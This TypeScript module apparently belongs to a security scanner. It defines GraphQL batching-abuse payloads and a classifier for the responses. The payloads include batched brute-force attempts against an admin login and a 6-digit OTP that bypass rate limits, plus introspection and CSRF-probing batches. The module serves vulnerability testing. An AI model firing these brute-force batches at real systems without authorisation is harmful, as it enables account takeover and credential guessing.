// Adapted from source-reference/vantix/secops/skills/ patterns.
// Rewritten in TypeScript. No runtime dependency on the vendored source.
import type { FamilyMetadata, OracleClassification, PayloadVariant, ProbeContext, ScannerResponseInput } from '../types';

export const META: FamilyMetadata = {
  id: 'graphql-batching-abuse',
  family: 'graphql-attack',
  title: 'GraphQL query batching abuse (rate-limit bypass / brute-force)',
  severity: 'high',
  destructiveRisk: 'none',
  requiresOast: false,
  requiresBrowser: false,
  insertionPointKinds: ['body', 'graphql'],
  expectedSignals: ['batch-accepted', 'rate-limit-bypassed', 'multiple-responses'],
  cwe: [770, 307],
};

function makeLoginBatch(count: number): string {
  const ops = Array.from({ length: count }, (_, i) =>
    `{"query":"mutation{login(username:\\"admin\\",password:\\"attempt${i + 1}\\"){token}}"}`
  );
  return `[${ops.join(',')}]`;
}

export function variants(_ctx: ProbeContext): PayloadVariant[] {
  return [
    {
      id: 'gql-batch-basic',
      family: 'graphql-attack',
      value: '[{"query":"{__typename}"},{"query":"{__typename}"}]',
      encoding: 'json-string',
      intent: 'Basic 2-query batch — check if batching is accepted at all',
      destructiveRisk: 'none',
      expectedSignals: ['batch-accepted', 'multiple-responses'],
    },
    {
      id: 'gql-batch-10-introspection',
      family: 'graphql-attack',
      value: JSON.stringify(Array.from({ length: 10 }, () => ({ query: '{__schema{types{name}}}' }))),
      encoding: 'json-string',
      intent: '10-query introspection batch — detect batch + introspection combination',
      destructiveRisk: 'none',
      expectedSignals: ['batch-accepted', 'multiple-responses'],
    },
    {
      id: 'gql-batch-50-login',
      family: 'graphql-attack',
      value: makeLoginBatch(50),
      encoding: 'json-string',
      intent: '50-attempt login batch — rate limit bypass via batching',
      destructiveRisk: 'none',
      expectedSignals: ['rate-limit-bypassed', 'batch-accepted'],
    },
    {
      id: 'gql-batch-array-single',
      family: 'graphql-attack',
      value: '[{"query":"{__typename}"}]',
      encoding: 'json-string',
      intent: 'Single-element array batch — probe if server accepts JSON array format',
      destructiveRisk: 'none',
      expectedSignals: ['batch-accepted'],
    },
    {
      id: 'gql-batch-mixed-ops',
      family: 'graphql-attack',
      value: '[{"query":"{__typename}"},{"query":"mutation{noop}"}]',
      encoding: 'json-string',
      intent: 'Mixed query+mutation batch — test if mutation in batch skips CSRF checks',
      destructiveRisk: 'none',
      expectedSignals: ['batch-accepted', 'rate-limit-bypassed'],
    },
    {
      id: 'gql-batch-100-otp',
      family: 'graphql-attack',
      value: JSON.stringify(Array.from({ length: 100 }, (_, i) => ({ query: `mutation{verifyOtp(code:"${String(i).padStart(6, '0')}"){ok}}` }))),
      encoding: 'json-string',
      intent: '100-code OTP batch — brute-force 6-digit OTP via batching if allowed',
      destructiveRisk: 'none',
      expectedSignals: ['rate-limit-bypassed', 'batch-accepted'],
    },
  ];
}

export function classify(
  resp: ScannerResponseInput,
  variant: PayloadVariant,
  _baseline: ScannerResponseInput,
): OracleClassification {
  const evidence: string[] = [];
  let responseClass: OracleClassification['responseClass'] = 'neutral-or-not-parsed';
  let confidence = 0.1;
  let nextAction: OracleClassification['nextAction'] = 'continue';

  let parsed: unknown;
  try {
    parsed = JSON.parse(resp.bodyText);
  } catch {
    parsed = null;
  }

  const isArray = Array.isArray(parsed);
  const body = resp.bodyText;
  const hasErrors = body.includes('"errors"');

  if (resp.statusCode === 200 && isArray) {
    const arr = parsed as unknown[];
    responseClass = 'expected-proof';
    confidence = 0.9;
    nextAction = 'promote-finding';
    evidence.push(`Batched response array with ${arr.length} elements — batching accepted`);
    evidence.push('Rate-limit bypass via batch requests is possible if per-request limits apply');
  } else if (resp.statusCode === 200 && body.includes('"data"') && !isArray) {
    responseClass = 'observed-value';
    confidence = 0.5;
    nextAction = 'continue';
    evidence.push('Single-response to batch — server may have merged or rejected batch');
  } else if (resp.statusCode === 400 && hasErrors) {
    responseClass = 'method-or-parser-rejected';
    confidence = 0.85;
    nextAction = 'stop-negative';
    evidence.push('Batch request rejected — server does not support batching');
  } else {
    nextAction = 'continue';
    evidence.push(`Inconclusive batch response (${resp.statusCode}) for ${variant.id}`);
  }

  return { payloadVariantId: variant.id, responseClass, confidence, evidence, nextAction };
}
